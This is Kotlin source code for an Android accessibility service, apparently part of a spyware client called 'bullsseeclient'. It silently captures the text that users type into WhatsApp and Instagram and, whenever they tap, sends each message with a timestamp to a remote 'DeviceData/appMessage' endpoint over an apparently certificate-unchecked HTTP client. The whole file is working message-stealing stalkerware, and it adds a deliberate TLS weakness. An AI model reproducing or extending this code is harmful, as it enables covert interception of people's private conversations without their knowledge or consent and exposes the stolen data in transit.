package com.example.bullsseeclient.services

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import com.example.bullsseeclient.HttpClient
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import com.google.gson.annotations.SerializedName
import java.time.Instant

class MessageAccessibilityService : AccessibilityService() {
    private val targets = setOf("com.whatsapp", "com.instagram.android")
    private val lastText = mutableMapOf<String, String>()

    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val pkg = event.packageName?.toString() ?: return
        if (!targets.contains(pkg)) return
        when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val t = extractText(event)
                if (t.isNotBlank()) lastText[pkg] = t
            }
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val text = lastText[pkg]
                if (!text.isNullOrBlank()) {
                    send(AppMsgDto(app = pkg, body = text, type = "OUTGOING", date = Instant.now().toString()))
                    lastText.remove(pkg)
                }
            }
        }
    }

    override fun onInterrupt() {}

    private fun extractText(event: AccessibilityEvent): String {
        val a = event.text?.joinToString(" ")?.trim().orEmpty()
        if (a.isNotBlank()) return a
        val src = event.source
        val b = src?.text?.toString()?.trim().orEmpty()
        return b
    }

    private fun send(dto: AppMsgDto) {
        val retrofit = Retrofit.Builder()
            .baseUrl(HttpClient.BASE_URL)
            .addConverterFactory(GsonConverterFactory.create())
            .client(HttpClient.getUnsafeOkHttpClient())
            .build()
        val api = retrofit.create(ApiAppMsg::class.java)
        val body = RequestBody.create("application/json".toMediaType(), com.google.gson.Gson().toJson(dto))
        api.send(body).enqueue(object : retrofit2.Callback<Void> {
            override fun onResponse(call: retrofit2.Call<Void>, response: retrofit2.Response<Void>) {}
            override fun onFailure(call: retrofit2.Call<Void>, t: Throwable) {}
        })
    }

    interface ApiAppMsg {
        @retrofit2.http.POST("api/DeviceData/appMessage")
        fun send(@retrofit2.http.Body data: okhttp3.RequestBody): retrofit2.Call<Void>
    }

    data class AppMsgDto(
        @SerializedName("App") val app: String,
        @SerializedName("Body") val body: String,
        @SerializedName("Type") val type: String,
        @SerializedName("Date") val date: String
    )
}

